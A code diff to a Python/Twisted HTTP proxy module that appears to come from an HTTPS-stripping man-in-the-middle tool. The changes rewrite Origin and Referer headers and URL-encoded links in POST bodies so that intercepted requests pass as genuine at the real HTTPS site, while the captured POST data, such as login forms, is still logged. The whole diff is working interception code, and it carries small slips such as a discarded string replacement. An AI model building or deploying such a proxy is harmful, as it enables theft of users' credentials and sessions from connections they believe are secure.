@@ -22,7 +22,7 @@ from twisted.web.http import HTTPClient
 
 import urlparse
 
-from change import local_host, replaceCookie, tld, path_host_dict, getNewUrl
+from change import local_host, replaceCookie, tld, path_host_dict, getNewUrl, getHost
 
 
 class ServerConnection(HTTPClient):
@@ -32,7 +32,7 @@ class ServerConnection(HTTPClient):
     from HTTPS to HTTP.
     '''
     urlExpression = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
-
+    localUrlExpression = re.compile(r"http%3A%2F%2F"+local_host+r".{0,15}", re.IGNORECASE)
     def __init__(self, command, uri, postData, headers, client):
         self.command          = command
         self.uri              = uri
@@ -56,14 +56,17 @@ class ServerConnection(HTTPClient):
 
     def sendHeaders(self):
         for header, value in self.headers.items():
+            if header=="origin" or header=="referer":
+                value = self.replacePostHeaderUrl(value)
             logging.log(self.getLogLevel(), "Sending header: %s : %s" % (header, value))
             self.sendHeader(header, value)
 
         self.endHeaders()
 
     def sendPostData(self):
-        logging.warning(self.getPostPrefix() + " Data (" + self.headers['host'] + "):\n" + str(self.postData))
-        self.transport.write(self.postData)
+        postData = self.replacePostLinks(self.postData)
+        logging.warning(self.getPostPrefix() + " Data (" + self.headers['host'] + "):\n" + str(postData))
+        self.transport.write(postData)
 
     def connectionMade(self):
         logging.log(self.getLogLevel(), "HTTP connection made.")
@@ -127,7 +130,7 @@ class ServerConnection(HTTPClient):
             
         logging.log(self.getLogLevel(), "Read from server:\n" + data)
 
-        data = self.replaceLinks(data)
+        data = self.replaceReceivedLinks(data)
         
         #logging.log(self.getLogLevel(), "CHANGED DATA:\n" + data)
 
@@ -137,7 +140,7 @@ class ServerConnection(HTTPClient):
         self.client.write(data)
         self.shutdown()
 
-    def replaceLinks(self, data):
+    def replaceReceivedLinks(self, data):
         replace_dict = {}
 
         data = data.replace('&amp;', '&') 
@@ -149,8 +152,12 @@ class ServerConnection(HTTPClient):
             url = match.group()
             host = urlparse.urlparse(url).netloc
             if tld in host:
-                #index = url.find('/', 8)
-                #path = url[index:]
+                index = url.find('/', 8)
+                if index!=-1:
+                    path = url[index:]
+                else:
+                    path="/"
+
                 path = urlparse.urlparse(url).path
                 replace_dict[url] = path
         
@@ -167,6 +174,40 @@ class ServerConnection(HTTPClient):
 
         return data
     
+    def replacePostLinks(self, data):
+        iterator = re.finditer(ServerConnection.localUrlExpression, data)
+        
+        links = []
+        for match in iterator:
+            url = match.group()
+            print "Post Find: "+url
+            url.replace("%2F","/")
+            index = url.find('/', 8)
+            if index!=-1:
+                path = url[index:]
+            else:
+                path = "/"
+            target_host = self.client.realHost
+            new_url = "https%3A%2F%2F"+target_host
+            local_url = "http%3A%2F%2F"+local_host
+            data = data.replace(local_url, new_url)
+
+        return data
+
+    def replacePostHeaderUrl(self, url):
+        local_url = "http://"+local_host
+        if url.startswith(local_url):
+            print "Start: "+url
+            index = url.find('/', 8)
+            if index!=-1:
+                path = url[index:]
+            else:
+                path = "/"
+            target_host = self.client.realHost
+            url = "https://"+target_host+path
+        print "Changed: "+url
+        return url
+
     def shutdown(self):
         if not self.shutdownComplete:
             self.shutdownComplete = True
